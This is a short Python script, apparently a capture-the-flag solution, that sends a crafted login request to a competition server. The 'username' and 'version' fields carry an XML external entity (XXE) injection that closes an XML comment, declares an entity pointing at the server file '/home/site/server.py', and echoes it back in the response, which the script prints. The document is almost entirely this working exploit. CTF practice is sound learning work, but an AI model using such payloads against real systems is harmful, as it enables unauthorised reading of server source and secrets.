#!/usr/bin/env python3
import requests

url = 'http://challenges2.hexionteam.com:2002'

r = requests.post(f'{url}/login', data={
    'username': '''
&test;
''',
    'version': '''
-->
<!DOCTYPE root [
<!ENTITY test SYSTEM "/home/site/server.py">
]>
<!--
''',
})
r.raise_for_status()
for header in r.headers.items():
    print(header)
print(r.content.decode())
